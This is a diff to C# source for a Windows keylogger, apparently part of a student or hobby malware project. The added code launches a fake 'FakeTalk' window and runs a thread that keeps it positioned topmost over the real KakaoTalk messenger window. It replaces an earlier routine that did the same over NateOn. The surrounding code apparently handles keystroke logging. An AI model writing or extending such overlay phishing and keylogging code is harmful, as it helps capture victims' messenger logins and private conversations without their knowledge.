@@ -11,7 +11,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.Threading;
-
+using System.Diagnostics;
 
 namespace Windows_KeyLogger
 {
@@ -68,26 +68,7 @@ namespace Windows_KeyLogger
             }
 
         }
-        public void gnt()
-        {
-            IntPtr HWND_TOPMOST = new IntPtr(-1);
-            IntPtr no = new IntPtr(0);
-            int natehWnd;
-            int formhWnd;
-            RECT nateonplace = default(RECT);
-            int natetop, nateleft, nateright, natebottom;
-            natehWnd = FindWindow(null, "NateOn");
-            formhWnd = FindWindow(null, "FakeForm");
-            while (true)
-            {
-                GetWindowRect(natehWnd, ref nateonplace);
-                natetop = nateonplace.top;
-                nateleft = nateonplace.left;
-                nateright = nateonplace.right;
-                natebottom = nateonplace.bottom;
-                SetWindowPos(formhWnd, HWND_TOPMOST, (nateleft)+5, (natetop)+5, nateright-nateleft, natebottom-natetop, 0x40);
-            }
-        }
+
         public void savelog()
         {
             //while (isHooking)
@@ -198,10 +179,62 @@ namespace Windows_KeyLogger
             dicLower[Keys.Decimal] = dicUpper[Keys.Decimal] = ".";
         }
 
-        private void btnNate_Click(object sender, EventArgs e)
+        private FakeTalk fakeForm = null;
+        private Thread t1 = null;
+        private void button1_Click_1(object sender, EventArgs e)
         {
-            new FakeForm().Show();
-            gnt();
+            if(fakeForm == null)
+            {
+                fakeForm = new FakeTalk(this);
+                fakeForm.Show();
+                t1 = new Thread(gnt);
+                t1.Start();
+            }
+            else
+            {
+                t1.Interrupt();
+                t1 = null;
+                fakeForm.Hide();
+                fakeForm = null;
+            }
+
+        }
+
+        public void gnt()
+        {
+            IntPtr HWND_TOPMOST = new IntPtr(-1);
+            IntPtr no = new IntPtr(0);
+            int kakaohWnd = 0;
+            int formhWnd;
+            RECT kakaotalkplace = default(RECT);
+            RECT faketalkplace = default(RECT);
+            int kakaotop, kakaoleft;
+            int fakeWidth, fakeHeight;
+            Process[] processlist = Process.GetProcesses();
+
+            formhWnd = FindWindow(null, "FakeTalk");
+            while (true)
+            {
+                if(kakaohWnd != 0)
+                {
+                    GetWindowRect(kakaohWnd, ref kakaotalkplace);
+                    GetWindowRect(formhWnd, ref faketalkplace);
+
+                    kakaotop = kakaotalkplace.top;
+                    kakaoleft = kakaotalkplace.left;
+                    fakeWidth = Math.Abs(faketalkplace.right - faketalkplace.left);
+                    fakeHeight = Math.Abs(faketalkplace.top - faketalkplace.bottom);
+
+                    //kakaoright = kakaoonplace.right;
+                    //kakaobottom = kakaoonplace.bottom;
+                    SetWindowPos(formhWnd, HWND_TOPMOST, kakaoleft + 10, kakaotop + 10, fakeWidth, fakeHeight, 0x40);
+                }else
+                {
+                    kakaohWnd = FindWindow(null, "카카오톡");
+                }
+                
+
+            }
         }
     }
 }
